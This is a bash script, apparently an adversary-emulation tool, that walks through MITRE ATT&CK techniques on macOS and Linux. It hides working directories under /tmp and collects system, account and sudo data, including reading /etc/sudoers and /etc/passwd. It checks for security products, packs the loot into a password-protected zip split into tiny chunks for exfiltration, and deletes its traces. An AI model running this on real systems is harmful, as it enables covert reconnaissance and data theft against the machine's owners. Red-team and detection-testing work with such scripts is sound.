#!/bin/bash


# Technique: Hide Artifacts: Hidden Files and Directories https://attack.mitre.org/techniques/T1564/001/
# Create a hidden directory to store our collected data in
if [ ! -d "/tmp/.staging/" ]; then mkdir -p /tmp/.staging/; fi;
if [ ! -d "/tmp/.exfil/" ]; then mkdir -p /tmp/.exfil/; fi;


############################################
# Tactic: Discovery
# Technique: System Information Discovery https://attack.mitre.org/wiki/Technique/T1082
############################################
function discovery() {
  SYSINF="/tmp/.staging/system.txt"
  MACCHECK="$(sw_vers -productName | cut -d ' ' -f1)"

  if [[ "$MACCHECK" == "Mac" ]]; then
    PLAT="Mac"
  else
    PLAT="Linux"
  fi

  echo "Target Platform - " $PLAT
  echo "Target Platform: " $PLAT >> $SYSINF
  echo "Target Kernel:" >> $SYSINF && uname -a >> $SYSINF
  echo "Uptime:" >> $SYSINF && uptime >> $SYSINF
  echo "hostname:" >> $SYSINF && hostname >> $SYSINF
  echo "Getting General Release Information"

  if [ "$PLAT" = "Mac" ]; then
    echo "Getting macOS Release Information"
    echo "System Profiler:" >> $SYSINF
    system_profiler >> $SYSINF 2> /dev/null
  else
    echo "Getting Linux Release Information"
    echo "Release:" >> $SYSINF
    lsb_release >> $SYSINF 2> /dev/null
  fi

  ### Technique: Account Discovery https://attack.mitre.org/wiki/Technique/T1087
  ### Collect User Account Information
  USERINF=/tmp/.staging/users.txt
  echo "Getting User Information"

  echo "Whoami:" >> $USERINF && whoami >> $USERINF
  echo "Current User Activity:" >> $USERINF && w >> $USERINF 2> /dev/null
  echo "Sudo Privs" >> $USERINF && sudo -l -n >> $USERINF 2> /dev/null
  echo "Sudoers" >> $USERINF && cat /etc/sudoers >> $USERINF 2> /dev/null
  echo "Last:" >> $USERINF && last >> $USERINF 2> /dev/null

  if [ "$PLAT" == "Mac" ]; then
    echo "Getting Mac Group Information"
    echo "Group Information:" >> $USERINF
    dscl . list /Groups >> $USERINF
    dscacheutil -q group >> $USERINF
  else
    echo "Getting Linux Group Information"
    echo "Group Information:" >> $USERINF
    cat /etc/passwd >> $USERINF
    echo "Elevated Users" >> $USERINF && grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' >> $USERINF
  fi

  ### Technique: Software Discovery: Security Software Discovery https://attack.mitre.org/techniques/T1518/001/
  ### Check for common security Software
  SECINF=/tmp/.staging/security.txt
  echo "Getting Security Software Information"
  echo "Running Security Processes" >> $SECINF && ps ax | grep -v grep | grep -e Carbon -e Snitch -e OpenDNS -e RTProtectionDaemon -e CSDaemon -e cma >> $SECINF
}


############################################
# Tacttic: Exfiltration
# Technique:  Archive Collected Data: Archive via Library https://attack.mitre.org/techniques/T1560/002/
############################################
function exfil() {
echo "Compress and encrypt all collected data for exfil"
zip --password "Hope You Have Eyes on This!!" /tmp/.staging/loot.zip /tmp/.staging/* > /dev/null 2>&1

echo "Prepare Exfil data - Split file into small chucks (23byte) before Exfil"
split -a 15 -b 23 "/tmp/.staging/loot.zip" "/tmp/.exfil/loot.zip.part-"
}


############################################
# Tactic: Defense Evasion
# Technique: Delete File Indicator Removal on Host: File Deletion https://attack.mitre.org/techniques/T1070/004/
############################################
function cleanup() {
  rm -rf /tmp/.staging/
  rm -rf /tmp/payback
  # Optionally, delete exfil directory to clean up
#  rm -rf /tmp/.exfil/
}


discovery
#exfil
#cleanup
